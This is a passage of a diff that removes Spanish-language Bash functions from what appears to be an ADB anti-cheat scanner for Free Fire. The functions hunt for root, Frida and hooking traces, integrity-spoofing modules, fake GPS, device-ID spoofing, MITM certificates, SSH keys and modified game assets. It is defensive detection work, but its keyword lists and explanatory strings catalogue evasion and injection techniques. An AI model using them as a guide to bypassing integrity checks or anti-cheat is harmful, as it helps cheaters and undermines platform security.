-        if [ -n "$_tmp_age" ]; then
-            log_output "${R}[!] /data/local/tmp modificado recientemente pero vacío — posible limpieza de rastros${N}"
-            _ctx "Limpieza de tmp post-partida indica que el usuario eliminó payloads o herramientas antes del scan — huella de herramienta"
-            log_output "${Y}    Última modificación: $_tmp_mtime${N}"
-            MOTIVOS+=("tmp limpiado recientemente")
-            ((SUSPICIOUS_COUNT+=2))
-        fi
-    fi
-    if [ -n "$(echo "$TMP_FILES" | tr -d '[:space:]')" ]; then
-        log_output "${Y}[!] Archivos en /data/local/tmp:${N}"
-        echo "$TMP_FILES" | while read -r f; do
-            [ -z "$f" ] && continue
-            log_output "${Y}  $f${N}"
-            if echo "$f" | grep -qiE "frida|hook|inject|cheat|hack|bypass|shizuku|brevent"; then
-                log_output "${R}    ^ SOSPECHOSO${N}"; ((SUSPICIOUS_COUNT++))
-            fi
-        done
-        ((SUSPICIOUS_COUNT++))
-    else
-        log_output "${G}[✓] /data/local/tmp vacío${N}"
-    fi
-    echo ""
-}
-
-check_dropbox_crashes() {
-    sec_hdr "CRASHES SOSPECHOSOS (DROPBOX)"
-    CRASHES=$(adb shell 'dumpsys dropbox 2>/dev/null | grep -E "native_crash|TOMBSTONE|system_server" | sed "s/.*[0-9][0-9]:[0-9][0-9]:[0-9][0-9] //" | sed "s/ ([0-9]* bytes)//" | sort | uniq -c | sort -rn | awk '"'"'$1>=3{print $1" x "$2}'"'"' | head -5' | tr -d '\r')
-    if [ -n "$(echo "$CRASHES" | tr -d '[:space:]')" ]; then
-        log_output "${Y}[!] Crashes repetidos:${N}"
-        echo "$CRASHES" | while read -r line; do [ -n "$line" ] && log_output "${Y}  $line${N}"; done
-        ((SUSPICIOUS_COUNT++))
-    else
-        log_output "${G}[✓] Sin crashes repetidos${N}"
-    fi
-    PHANTOM=$(echo "$LOG_CACHE" | grep "PhantomProcessRecord" | tail -3)
-    if [ -n "$PHANTOM" ]; then
-        log_output "${Y}[!] PhantomProcessRecord (procesos matados):${N}"
-        echo "$PHANTOM" | while read -r line; do log_output "${Y}  $line${N}"; done
-    fi
-    echo ""
-}
-
-check_auto_time() {
-    sec_hdr "CONFIGURACIÓN DE FECHA/HORA"
-    AUTO_TIME=$(adb shell "settings get global auto_time 2>/dev/null" | tr -d '\r')
-    AUTO_TZ=$(adb shell "settings get global auto_time_zone 2>/dev/null" | tr -d '\r')
-    TIMEZONE=$(adb shell "getprop persist.sys.timezone 2>/dev/null" | tr -d '\r')
-    log_output "${B}[*] auto_time:     ${W}${AUTO_TIME:-desconocido}${N}"
-    log_output "${B}[*] auto_time_zone:${W}${AUTO_TZ:-desconocido}${N}"
-    log_output "${B}[*] Zona horaria:  ${W}${TIMEZONE:-desconocida}${N}"
-    if [ "$AUTO_TIME" = "0" ]; then
-        log_output "${R}[!] Hora automática DESACTIVADA — facilita manipulación de timestamps${N}"
-        _ctx "NTP desactivado permite ajustar el reloj manualmente para congelar o retroceder el tiempo del sistema"
-        ((SUSPICIOUS_COUNT+=2))
-    else
-        log_output "${G}[✓] Hora automática activa${N}"
-    fi
-    echo ""
-}
-
-check_pif() {
-    sec_hdr "PLAY INTEGRITY FIX / SPOOF DE INTEGRIDAD"
-    FOUND_PIF=0
-
-    PKG_LIST_PIF="$PKG_CACHE"
-    for pkg in "es.chiteroman.playintegrityfix" "com.chiteroman.playintegrityfix" "io.github.vvb2060.playintegrityfix"; do
-        if echo "$PKG_LIST_PIF" | grep -q "$pkg"; then
-            log_output "${R}[!] Play Integrity Fix instalado: $pkg${N}"
-            _ctx "PIF falsifica la respuesta de Play Integrity API — oculta root y bootloader desbloqueado al juego"
-            ((SUSPICIOUS_COUNT+=3)); FOUND_PIF=1
-        fi
-    done
-
-    PIF_MOD=$(adb shell "ls /data/adb/modules 2>/dev/null | grep -iE 'playintegrity|pif|integrit'" | tr -d '\r')
-    if [ -n "$PIF_MOD" ]; then
-        log_output "${R}[!] Módulo PIF en Magisk: $PIF_MOD${N}"; ((SUSPICIOUS_COUNT+=3)); FOUND_PIF=1
-    fi
-
-    TRICK=$(adb shell "ls /data/adb/modules 2>/dev/null | grep -i trick" | tr -d '\r')
-    if [ -n "$TRICK" ]; then
-        log_output "${R}[!] TrickyStore (bypass de integridad): $TRICK${N}"
-        _ctx "TrickyStore genera certificados KeyAttestation falsos — supera incluso Play Integrity STRONG"
-        ((SUSPICIOUS_COUNT+=3)); FOUND_PIF=1
-    fi
-
-    DEBUGGABLE=$(adb shell "getprop ro.debuggable 2>/dev/null" | tr -d '\r')
-    if [ "$DEBUGGABLE" = "1" ]; then
-        log_output "${Y}[!] ro.debuggable=1 — dispositivo en modo debug${N}"; ((SUSPICIOUS_COUNT++))
-    fi
-
-    [ $FOUND_PIF -eq 0 ] && log_output "${G}[✓] Sin Play Integrity Fix${N}"
-    echo ""
-}
-
-check_fakegps() {
-    sec_hdr "FAKE GPS / LOCATION SPOOFING"
-    local _found=0
-    local _gps_pkgs
-    _gps_pkgs=$(echo "$PKG_CACHE" | grep -iE         "fakegps|gps.joystick|lexa.fakegps|incorporateapps.com.fakeGPS|fakegps|mock.location|location.spoof|gps.spoofer|hola.fake.gps|byterev.fakegps|keinmor.fakegps|blogspot.fakegps" | tr -d '\r')
-    if [ -n "$_gps_pkgs" ]; then
-        echo "$_gps_pkgs" | while IFS= read -r _pkg; do
-            [ -z "$_pkg" ] && continue
-            log_output "${R}[!] App de Fake GPS detectada: $_pkg${N}"
-            _ctx "Fake GPS falsifica coordenadas de ubicación — usado para evadir bans por región o acceder a servidores distintos"
-            ((SUSPICIOUS_COUNT+=3)); _found=1
-        done
-        _found=1
-    fi
-
-    local _mock
-    _mock=$(adb shell "settings get secure mock_location 2>/dev/null" | tr -d '\r')
-    if [ "$_mock" = "1" ]; then
-        log_output "${R}[!] Mock Location activado en configuración del sistema${N}"
-        _ctx "Mock Location a nivel de sistema permite a cualquier app reemplazar la ubicación GPS real del dispositivo"
-        ((SUSPICIOUS_COUNT+=2)); _found=1
-    fi
-
-    local _mock_app
-    _mock_app=$(adb shell "appops query-op android:mock_location allow 2>/dev/null" | tr -d '\r' | grep -v '^$' | grep -vi "no operations" | head -3)
-    if [ -n "$_mock_app" ]; then
-        log_output "${R}[!] App con permiso Mock Location activo: $_mock_app${N}"
-        ((SUSPICIOUS_COUNT+=2)); _found=1
-    fi
-
-    [ $_found -eq 0 ] && log_output "${G}[✓] Sin Fake GPS detectado${N}"
-    echo ""
-}
-
-check_ueventd() {
-    sec_hdr "UEVENTD / KERNEL EVENTS"
-    local _found=0
-
-    local _ueventd_mod
-    _ueventd_mod=$(adb shell "ls -la /system/etc/ueventd.rc 2>/dev/null" | tr -d '\r')
-    local _ueventd_extra
-    _ueventd_extra=$(adb shell "find /system/etc -name 'ueventd*.rc' 2>/dev/null | grep -v '^/system/etc/ueventd.rc$'" | tr -d '\r')
-    if [ -n "$_ueventd_extra" ]; then
-        echo "$_ueventd_extra" | while IFS= read -r _f; do
-            [ -z "$_f" ] && continue
-            log_output "${R}[!] Archivo ueventd adicional sospechoso: $_f${N}"
-            ((SUSPICIOUS_COUNT+=3)); _found=1
-        done
-        _found=1
-    fi
-
-    local _ueventd_data
-    _ueventd_data=$(adb shell "find /data -name 'ueventd*' 2>/dev/null | head -5" | tr -d '\r')
-    if [ -n "$(echo "$_ueventd_data" | tr -d '[:space:]')" ]; then
-        echo "$_ueventd_data" | while IFS= read -r _f; do
-            [ -z "$_f" ] && continue
-            log_output "${R}[!] ueventd en /data (anómalo): $_f${N}"
-            _ctx "ueventd en /data indica custom rules para crear device nodes — usado por algunos cheats para inyectar código vía /dev"
-            ((SUSPICIOUS_COUNT+=4)); _found=1
-        done
-        _found=1
-    fi
-
-    local _ueventd_pid
-    _ueventd_pid=$(adb shell "ps -A 2>/dev/null | grep -w ueventd | grep -v grep" | tr -d '\r')
-    if [ -n "$_ueventd_pid" ]; then
-        local _uid
-        _uid=$(echo "$_ueventd_pid" | awk '{print $1}' | head -1)
-        if [ "$_uid" != "root" ] && [ -n "$_uid" ]; then
-            log_output "${R}[!] ueventd corriendo con UID inesperado: $_uid${N}"
-            ((SUSPICIOUS_COUNT+=3)); _found=1
-        else
-            log_output "${G}[✓] ueventd: UID root normal${N}"
-        fi
-    fi
-
-    [ $_found -eq 0 ] && log_output "${G}[✓] Sin anomalías en ueventd${N}"
-    echo ""
-}
-
-check_device_spoof() {
-    sec_hdr "DEVICE SPOOFING / EVASIÓN DE BAN"
-    FOUND_SPOOF=0
-
-    ANDROID_ID=$(adb shell "settings get secure android_id 2>/dev/null" | tr -d '\r\n')
-    log_output "${B}[*] Android ID: ${W}${ANDROID_ID:-no disponible}${N}"
-    if [ -n "$ANDROID_ID" ] && [ "$ANDROID_ID" != "null" ]; then
-        UNIQ=$(echo "$ANDROID_ID" | grep -oE '.' | sort -u | wc -l)
-        ID_LEN=${#ANDROID_ID}
-        if [ "$UNIQ" -le 2 ] || [ "$ID_LEN" -lt 15 ] 2>/dev/null; then
-            log_output "${R}[!] Android ID con patrón de spoof${N}"; ((SUSPICIOUS_COUNT+=2)); FOUND_SPOOF=1
-        fi
-    fi
-
-    HW_SERIAL=$(adb shell 'cat /sys/devices/soc0/serial_num 2>/dev/null || cat /sys/bus/soc/devices/soc0/serial_num 2>/dev/null' | tr -d '\r\n')
-    PROP_SERIAL=$(adb shell "getprop ro.serialno 2>/dev/null" | tr -d '\r\n')
-    if [ -n "$HW_SERIAL" ] && [ -n "$PROP_SERIAL" ] && [ "$HW_SERIAL" != "$PROP_SERIAL" ]; then
-        log_output "${R}[!] Serial adulterado — SoC: $HW_SERIAL ≠ prop: $PROP_SERIAL${N}"
-        _ctx "Serial de SoC ≠ serial de prop indica spoof de identificadores de hardware — evasión de ban por HWID"
-        ((SUSPICIOUS_COUNT+=3)); FOUND_SPOOF=1
-    fi
-
-    PKG_LIST_SP="$PKG_CACHE"
-    for pkg in "com.metatech.deviceidfaker" "com.deviceid.changer" "com.xposed.imei" "com.imei.generator" "com.devicechanger.free"; do
-        if echo "$PKG_LIST_SP" | grep -q "$pkg"; then
-            log_output "${R}[!] App de spoof de ID: $pkg${N}"; ((SUSPICIOUS_COUNT+=3)); FOUND_SPOOF=1
-        fi
-    done
-    SPOOF_NAME=$(echo "$PKG_LIST_SP" | grep -iE "$(printf '%s%s' "$(printf 'ZGV2aWNlaWR8aW1laS5jaGFuZw=='|base64 -d)" "$(printf 'ZXJ8ZmFrZWlkfGFuZHJvaWRpZA=='|base64 -d)")" | head -3)
-    if [ -n "$SPOOF_NAME" ]; then
-        log_output "${R}[!] App de spoof por nombre:${N}"
-        echo "$SPOOF_NAME" | while read -r l; do [ -n "$l" ] && log_output "${Y}  $l${N}"; done
-        ((SUSPICIOUS_COUNT+=3)); FOUND_SPOOF=1
-    fi
-
-    FIRST_INSTALL_MS=$(adb shell "dumpsys package $GAME_PKG 2>/dev/null | grep firstInstallTime | head -1 | grep -oE '[0-9]{10,}'" | tr -d '\r')
-    UPTIME_SECS=$(adb shell "cut -d. -f1 /proc/uptime 2>/dev/null" | tr -d '\r')
-    NOW_SECS=$(adb shell "date +%s 2>/dev/null" | tr -d '\r')
-    if [ -n "$FIRST_INSTALL_MS" ] && [ -n "$NOW_SECS" ] && [ -n "$UPTIME_SECS" ]; then
-        FIRST_S=$((FIRST_INSTALL_MS / 1000))
-        BOOT_EPOCH=$((NOW_SECS - UPTIME_SECS))
-        INSTALL_DAYS=$(( (NOW_SECS - FIRST_S) / 86400 ))
-        UPTIME_DAYS=$((UPTIME_SECS / 86400))
-        log_output "${B}[*] Juego instalado hace: ${W}${INSTALL_DAYS}d${N}  |  Uptime: ${W}${UPTIME_DAYS}d${N}"
-        if [ "$FIRST_S" -gt "$BOOT_EPOCH" ] && [ "$UPTIME_SECS" -gt 86400 ] 2>/dev/null; then
-            log_output "${Y}[!] Juego instalado después del último boot (reinstalación post-ban)${N}"
-            _ctx "Reinstalación posterior al boot puede indicar cambio de cuenta o HWID tras ban reciente"
-            ((SUSPICIOUS_COUNT+=2)); FOUND_SPOOF=1
-        fi
-        if [ "$INSTALL_DAYS" -le 3 ] && [ "$UPTIME_DAYS" -ge 7 ] 2>/dev/null; then
-            log_output "${Y}[!] Reinstalación reciente: juego ${INSTALL_DAYS}d vs dispositivo activo ${UPTIME_DAYS}d${N}"
-            ((SUSPICIOUS_COUNT++)); FOUND_SPOOF=1
-        fi
-    fi
-
-    [ $FOUND_SPOOF -eq 0 ] && log_output "${G}[✓] Sin indicadores de spoof${N}"
-    echo ""
-}
-
-check_ca_certs() {
-    sec_hdr "CERTIFICADOS CA / MITM"
-    USER_CERTS=$(adb shell "ls /data/misc/user/0/cacerts-added/ 2>/dev/null | wc -l" | tr -d '\r')
-    if [ "${USER_CERTS:-0}" -gt 0 ] 2>/dev/null; then
-        log_output "${R}[!] $USER_CERTS certificado(s) CA de usuario instalado(s) — posible MITM${N}"
-        _ctx "CA certs de usuario permiten descifrar TLS de Free Fire — herramientas como Fiddler/mitmproxy los requieren"
-        ((SUSPICIOUS_COUNT+=2))
-    else
-        log_output "${G}[✓] Sin CA certs de usuario${N}"
-    fi
-
-    KC_CERTS=$(adb shell "ls /data/misc/keychain/certs-added/ 2>/dev/null | wc -l" | tr -d '\r')
-    if [ "${KC_CERTS:-0}" -gt 0 ] 2>/dev/null; then
-        log_output "${Y}[!] $KC_CERTS cert(s) en keychain del sistema${N}"; ((SUSPICIOUS_COUNT++))
-    fi
-
-    SSH_KEYS=$(adb shell "find /data/adb /data/local /sdcard 2>/dev/null -maxdepth 4 \( -name 'authorized_keys' -o -name 'id_rsa' -o -name 'id_ed25519' \) | head -3" | tr -d '\r')
-    if [ -n "$(echo "$SSH_KEYS" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] Claves SSH encontradas (tunnel de evasión):${N}"
-        _ctx "Claves SSH permiten túnel remoto para controlar el dispositivo sin ADB — evasión de detección de conexiones"
-        echo "$SSH_KEYS" | while read -r f; do [ -n "$f" ] && log_output "${Y}  $f${N}"; done
-        ((SUSPICIOUS_COUNT+=2))
-    fi
-    echo ""
-}
-
-check_mantis_keymap() {
-    sec_hdr "KEYMAPPERS / CONTROLES EXTERNOS"
-    FOUND_KM=0
-
-    PKG_LIST_KM="$PKG_CACHE"
-    declare -A KM_APPS
-    KM_APPS=(
-        ["com.mantis.gamepad"]="Mantis Gamepad"
-        ["com.panda.gamepad"]="Panda Gamepad"
-        ["com.gamesir.global"]="GameSir"
-        ["com.flydigi.center"]="Flydigi"
-        ["com.tincore.gsp.gpad"]="Octopus Keymapper"
-        ["io.github.ggmouse"]="GG Mouse"
-        ["com.regula.mantisactivator"]="Mantis Activator"
-    )
-    for pkg in "${!KM_APPS[@]}"; do
-        if echo "$PKG_LIST_KM" | grep -q "$pkg"; then
-            log_output "${Y}[!] Keymapper: ${KM_APPS[$pkg]} ($pkg)${N}"; ((SUSPICIOUS_COUNT+=2)); FOUND_KM=1
-        fi
-    done
-    KM_NAME=$(echo "$PKG_LIST_KM" | grep -iE "$(printf '%s%s' "$(printf 'bWFudGlzfGtleW1hcHxn'|base64 -d)" "$(printf 'YW1lcGFkLiphY3RpdmF0'|base64 -d)")" | head -3)
-    if [ -n "$KM_NAME" ] && [ $FOUND_KM -eq 0 ]; then
-        log_output "${Y}[!] Keymapper por nombre:${N}"
-        echo "$KM_NAME" | while read -r l; do [ -n "$l" ] && log_output "${Y}  $l${N}"; done
-        ((SUSPICIOUS_COUNT+=2)); FOUND_KM=1
-    fi
-
-    [ $FOUND_KM -eq 0 ] && log_output "${G}[✓] Sin keymappers${N}"
-    echo ""
-}
-
-check_recording() {
-    sec_hdr "GRABACIÓN / ESPEJAMIENTO / SCRCPY"
-    FOUND_REC=0
-
-    PKG_LIST_REC="$PKG_CACHE"
-    declare -A MIRROR_APPS
-    MIRROR_APPS=(
-        ["com.koushikdutta.vysor"]="Vysor"
-        ["com.genymobile.scrcpy"]="scrcpy"
-        ["com.github.xianfeng92.scrcpy"]="QtScrcpy"
-        ["top.samir.guiscrcpy"]="guiScrcpy"
-    )
-    for pkg in "${!MIRROR_APPS[@]}"; do
-        if echo "$PKG_LIST_REC" | grep -q "$pkg"; then
-            log_output "${Y}[!] App de espejamiento: ${MIRROR_APPS[$pkg]}${N}"; ((SUSPICIOUS_COUNT++)); FOUND_REC=1
-        fi
-    done
-
-    MEDIA_PROJ=$(adb shell "dumpsys media_projection 2>/dev/null | grep -iE 'isRecording=true|state=STARTED' | head -2" | tr -d '\r')
-    if [ -n "$(echo "$MEDIA_PROJ" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] CAPTURA DE PANTALLA ACTIVA${N}"
-        _ctx "Captura de pantalla activa durante el juego es la técnica base de herramientas de replay y transmisión de partidas"
-        ((SUSPICIOUS_COUNT+=2)); FOUND_REC=1
-    fi
-
-    SCRCPY_PROC=$(echo "$PS_CACHE" | grep -i scrcpy)
-    if [ -n "$SCRCPY_PROC" ]; then
-        log_output "${R}[!] Proceso scrcpy activo${N}"
-        _ctx "scrcpy es la herramienta más usada para transmitir pantalla vía ADB — base de la mayoría de replay tools"
-        ((SUSPICIOUS_COUNT+=2)); FOUND_REC=1
-    fi
-
-    REC_LOCK=$(adb shell "cat /proc/net/unix 2>/dev/null | grep -iE 'recordLock|recordUnlock' | head -2" | tr -d '\r')
-    if [ -n "$(echo "$REC_LOCK" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] Record lock en sockets Unix${N}"; ((SUSPICIOUS_COUNT+=2)); FOUND_REC=1
-    fi
-
-    [ $FOUND_REC -eq 0 ] && log_output "${G}[✓] Sin grabación activa${N}"
-    echo ""
-}
-
-check_scenes() {
-    sec_hdr "MODIFICACIÓN DE ESCENAS / ASSETS / PAYLOAD"
-    FOUND_SC=0
-
-    NDKVS=$(adb shell "find /sdcard/Android/data/$GAME_PKG -name '*.ndkvs' 2>/dev/null | head -3" | tr -d '\r')
-    if [ -n "$(echo "$NDKVS" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] Archivo .ndkvs detectado (Free Fire modificado):${N}"
-        _ctx "Archivos .ndkvs son escenas modificadas de Free Fire — contienen código de cheat inyectado en el runtime del juego"
-        echo "$NDKVS" | while read -r f; do [ -n "$f" ] && log_output "${Y}  $f${N}"; done
-        ((SUSPICIOUS_COUNT+=3)); FOUND_SC=1
-    fi
-
-    SCENE_DIR="/sdcard/Android/data/$GAME_PKG/files/contentcache/Optional/android/gameassetbundles"
-    NON_UNITY=$(adb shell "find '$SCENE_DIR' -type f 2>/dev/null | while read f; do
-        case \"\$f\" in *\~*) continue ;; esac
-        h=\$(head -c 7 \"\$f\" 2>/dev/null)
-        [ \"\$h\" != 'UnityFS' ] && echo \"\$f\"
-    done | head -5" | tr -d '\r')
-    if [ -n "$(echo "$NON_UNITY" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] Assets no-UnityFS (posible wallhack/scene mod):${N}"
-        _ctx "Assets sin firma UnityFS en contentcache son payloads de cheat — reemplazan modelos para hacer paredes/objetos transparentes"
-        echo "$NON_UNITY" | while read -r f; do [ -n "$f" ] && log_output "${Y}  $f${N}"; done
-        ((SUSPICIOUS_COUNT+=3)); FOUND_SC=1
-    fi
-
-    EXPLOITS=$(adb shell "find /data/local/tmp 2>/dev/null \( -name '*.so' -o -name 'payload*' -o -name 'exploit*' -o -name '*.bin' \) | head -5" | tr -d '\r')
-    if [ -n "$(echo "$EXPLOITS" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] Exploit/payload en /data/local/tmp:${N}"
-        _ctx "Archivos .so/.bin en tmp son payloads de inyección — se cargan en el proceso de Free Fire vía dlopen o ptrace"
-        echo "$EXPLOITS" | while read -r f; do [ -n "$f" ] && log_output "${Y}  $f${N}"; done
-        ((SUSPICIOUS_COUNT+=3)); FOUND_SC=1
-    fi
-
-    [ $FOUND_SC -eq 0 ] && log_output "${G}[✓] Sin modificación de escenas/assets${N}"
-    echo ""
-}
-
-check_termux_on_device() {
-    sec_hdr "TERMUX / HERRAMIENTAS DE EVASION EN DISPOSITIVO"
-    FOUND_TX=0
-
-    TERMUX_PKG=$(echo "$PKG_CACHE" | grep -iE "$(printf '%s%s' "$(printf 'Y29tLnRlcm0='|base64 -d)" "$(printf 'dXh8dGVybXV4'|base64 -d)")")
-    if [ -n "$TERMUX_PKG" ]; then
-        log_output "${Y}[!] Termux instalado en dispositivo escaneado (informativo):${N}"
-        echo "$TERMUX_PKG" | while read -r p; do [ -n "$p" ] && log_output "${Y}  $p${N}"; done
-        log_output "${B}[*] Nota: puede usarse para scripts de bypass${N}"
-        FOUND_TX=1
-    fi
-
-    [ $FOUND_TX -eq 0 ] && log_output "${G}[✓] Sin Termux ni shells externos${N}"
-
-    echo ""
-}
-
-check_xiaomi_paths() {
-    sec_hdr "BYPASS XIAOMI / MIUI / HYPEROS"
-    FOUND_MI=0
-
-    BRAND=$(adb shell "getprop ro.product.brand 2>/dev/null" | tr -d '\r' | tr '[:upper:]' '[:lower:]')
-    if echo "$BRAND" | grep -qiE "xiaomi|redmi|poco"; then
-        log_output "${B}[*] Dispositivo Xiaomi/Redmi/POCO — verificando paths especificos...${N}"
-
-        MI_ROOT_PATHS=$(adb shell "ls /data/miui 2>/dev/null; ls /data/system/miui* 2>/dev/null;             getprop ro.miui.ui.version.name 2>/dev/null; getprop ro.build.hyperos.version 2>/dev/null" | tr -d '\r')
-
-        MI_SU=$(adb shell "find /system/xbin /system/bin 2>/dev/null -name 'su*' | head -5" | tr -d '\r')
-        if [ -n "$(echo "$MI_SU" | tr -d '[:space:]')" ]; then
-            log_output "${R}[!] Binario su en paths MIUI:${N}"
-            echo "$MI_SU" | while read -r f; do [ -n "$f" ] && log_output "${Y}  $f${N}"; done
-            ((SUSPICIOUS_COUNT+=2)); FOUND_MI=1
-        fi
-
-        MI_BYPASS=$(adb shell "getprop ro.miui.disable_dm_verity 2>/dev/null;             getprop persist.miui.disable_dm_verity 2>/dev/null" | tr -d '\r' | grep -v '^$')
-        if [ -n "$MI_BYPASS" ]; then
-            log_output "${Y}[!] DM-Verity modificado en MIUI: $MI_BYPASS${N}"
-            ((SUSPICIOUS_COUNT++)); FOUND_MI=1
-        fi
-
-        [ $FOUND_MI -eq 0 ] && log_output "${G}[✓] Sin indicadores de bypass Xiaomi${N}"
-    else
-        log_output "${G}[✓] No es dispositivo Xiaomi — omitido${N}"
-    fi
-    echo ""
-}
-
-check_active_dns() {
-    sec_hdr "ANÁLISIS DNS / INTERCEPCIÓN DE RED"
-    FOUND_DNS=0
-
-    DNS1=$(echo "$PROP_CACHE" | grep '"net.dns1"' | grep -oE '\[.*\]$' | tr -d '[]' | head -1)
-    DNS2=$(echo "$PROP_CACHE" | grep '"net.dns2"' | grep -oE '\[.*\]$' | tr -d '[]' | head -1)
-    [ -z "$DNS1" ] && DNS1=$(adb shell "getprop net.dns1 2>/dev/null" | tr -d '\r')
-    [ -z "$DNS2" ] && DNS2=$(adb shell "getprop net.dns2 2>/dev/null" | tr -d '\r')
-    log_output "${B}[*] DNS primario:   ${W}${DNS1:-no configurado}${N}"
-    log_output "${B}[*] DNS secundario: ${W}${DNS2:-no configurado}${N}"
-
-    KNOWN_DNS="^(8\.8\.|8\.4\.|1\.1\.|1\.0\.|9\.9\.9|149\.112|208\.67|185\.228|94\.140|192\.168|10\.|172\.1[6-9]\.|172\.2[0-9]\.|172\.3[01]\.|127\.|$)"
-    for DNS_VAL in "$DNS1" "$DNS2"; do
-        [ -z "$DNS_VAL" ] && continue
-        if ! echo "$DNS_VAL" | grep -qE "$KNOWN_DNS"; then
-            log_output "${R}[!] DNS sospechoso (posible intercepción): $DNS_VAL${N}"
-            ((SUSPICIOUS_COUNT+=2)); FOUND_DNS=1
-        fi
-    done
-
-    for SERVER in "1.1.1.1" "8.8.8.8"; do
-        PING_R=$(adb shell "ping -c 1 -W 3 $SERVER 2>/dev/null | grep -E 'time=|unreachable|100%'" | tr -d '\r')
-        if echo "$PING_R" | grep -qE "unreachable|100%"; then
-            log_output "${Y}[!] Sin conectividad a $SERVER — posible bloqueo${N}"
-            ((SUSPICIOUS_COUNT++)); FOUND_DNS=1
-        elif [ -n "$PING_R" ]; then
-            log_output "${G}[✓] Conectividad a $SERVER OK${N}"
-        fi
-    done
-
-    [ $FOUND_DNS -eq 0 ] && log_output "${G}[✓] DNS y conectividad normales${N}"
-    echo ""
-}
-
-check_active_protocols() {
-    sec_hdr "PUERTOS SOSPECHOSOS (SSH/FTP/IMAP/SOCKS)"
-    FOUND_PROTO=0
-
-    TCP_CONNS=$(echo "$TCP_CACHE" | awk '{print $3}' | grep -v "rem_address" | sort -u)
-
-    declare -A PROTO_PORTS
-    PROTO_PORTS=(
-        ["SSH"]="0016"
-        ["FTP"]="0015"
-        ["SMTP"]="0019"
-        ["IMAP"]="008F"
-        ["IMAP-SSL"]="03E1"
-        ["POP3"]="006E"
-        ["POP3-SSL"]="03E3"
-        ["SOCKS"]="0438"
-        ["PROXY-8080"]="1F90"
-        ["PROXY-8888"]="22B8"
-    )
-
-    for proto in "${!PROTO_PORTS[@]}"; do
-        PORT_HEX="${PROTO_PORTS[$proto]}"
-        if echo "$TCP_CONNS" | grep -iq ":${PORT_HEX}"; then
-            log_output "${R}[!] Conexion $proto activa (puerto sospechoso)${N}"
-            ((SUSPICIOUS_COUNT+=2)); FOUND_PROTO=1
-        fi
-    done
-
-    SOCKS5=$(echo "$TCP_CACHE" | awk '{print $3}' | grep -i ":0438")
-    if [ -n "$(echo "$SOCKS5" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] SOCKS5 proxy activo en puerto 1080${N}"
-        ((SUSPICIOUS_COUNT+=2)); FOUND_PROTO=1
-    fi
-
-    [ $FOUND_PROTO -eq 0 ] && log_output "${G}[✓] Sin puertos de protocolo sospechoso${N}"
-    echo ""
-}
-
-check_logcat_delta() {
-    sec_hdr "EVENTOS NUEVOS EN LOGCAT DURANTE EL SCAN"
-    log_output "${B}[+] Capturando eventos nuevos desde inicio del scan...${N}"
-    LOG_ACTUAL=$(adb shell "logcat -d -b all 2>/dev/null | tail -n 6000" | tr -d '\r')
-
-    LOG_NUEVO=$(echo "$LOG_ACTUAL" | grep -A 999999 "$LOG_LAST_LINE" 2>/dev/null | tail -n +2)
-    [ -z "$LOG_NUEVO" ] && LOG_NUEVO=$(echo "$LOG_ACTUAL" | tail -n 500)
-
-    FOUND_LOG=0
-
-    INJECT_LOG=$(echo "$LOG_NUEVO" | grep -iE 'inject|hook|frida|xposed|lsposed|bypass|cheat' | grep -viE 'knox|google|InputDispatcher|injectInputEvent|KeyButtonView|dalvik-internals|hooked signal|hooked sigaction|LogPrintln|Inject motion|Inject key|adbd.*service requested|libxposed_art|libEdXposed|libzygisk|pm dump.*freefireth' | head -5)
-    if [ -n "$INJECT_LOG" ]; then
-        log_output "${R}[!] ACTIVIDAD SOSPECHOSA EN LOG DURANTE EL SCAN:${N}"
-        echo "$INJECT_LOG" | while read -r l; do [ -n "$l" ] && log_output "${Y}  $l${N}"; done
-        ((SUSPICIOUS_COUNT+=3)); FOUND_LOG=1
-    fi
-
-    ROOT_LOG=$(echo "$LOG_NUEVO" | grep -iE 'su: |granted root|superuser|magisk.*allow|access granted' | grep -viE 'knox' | head -3)
-    if [ -n "$ROOT_LOG" ]; then
-        log_output "${R}[!] ACTIVIDAD DE ROOT DURANTE EL SCAN:${N}"
-        echo "$ROOT_LOG" | while read -r l; do [ -n "$l" ] && log_output "${Y}  $l${N}"; done
-        ((SUSPICIOUS_COUNT+=3)); FOUND_LOG=1
-    fi
-
-    CRASH_LOG=$(echo "$LOG_NUEVO" | grep -iE "$(printf '%s%s' "$(printf 'RkFUQUx8Zm9yY2UuY2w='|base64 -d)" "$(printf 'b3N8bmF0aXZlIGNyYXNo'|base64 -d)")" | grep -i "${GAME_PKG}" | head -3)
-    if [ -n "$CRASH_LOG" ]; then
-        log_output "${Y}[!] Crash del juego durante el scan (posible cheat inestable):${N}"
-        echo "$CRASH_LOG" | while read -r l; do [ -n "$l" ] && log_output "${Y}  $l${N}"; done
-        ((SUSPICIOUS_COUNT++)); FOUND_LOG=1
-    fi
-
-    [ $FOUND_LOG -eq 0 ] && log_output "${G}[✓] Sin eventos sospechosos nuevos en logcat${N}"
-    echo ""
-}
-
-check_process_delta() {
-    sec_hdr "PROCESOS NUEVOS DURANTE EL SCAN (DELTA)"
-    log_output "${B}[+] Comparando procesos inicio vs fin del scan...${N}"
-    PS_SNAPSHOT_FIN=$(adb shell "ps -A 2>/dev/null" | tr -d '\r')
-
-    PIDS_INICIO=$(echo "$PS_SNAPSHOT_INICIO" | awk '{print $2}' | sort)
-    PIDS_FIN=$(echo "$PS_SNAPSHOT_FIN"    | awk '{print $2}' | sort)
-
-    NUEVOS_PIDS=$(comm -13 <(echo "$PIDS_INICIO") <(echo "$PIDS_FIN") 2>/dev/null)
-    FOUND_DELTA=0
-
-    if [ -n "$NUEVOS_PIDS" ]; then
-        while read -r pid; do
-            [ -z "$pid" ] && continue
-            PROC_LINE=$(echo "$PS_SNAPSHOT_FIN" | awk -v p="$pid" '$2==p {print}' | head -1)
-            PROC_NAME=$(echo "$PROC_LINE" | awk '{print $NF}')
-            if echo "$PROC_NAME" | grep -qiE 'frida|hook|cheat|bypass|magisk|xposed|lsposed|shizuku|su$'; then
-                log_output "${R}[!] PROCESO SOSPECHOSO APARECIO DURANTE EL SCAN: $PROC_NAME (PID $pid)${N}"
-                ((SUSPICIOUS_COUNT+=3)); FOUND_DELTA=1
-            fi
-        done <<< "$NUEVOS_PIDS"
-    fi
-
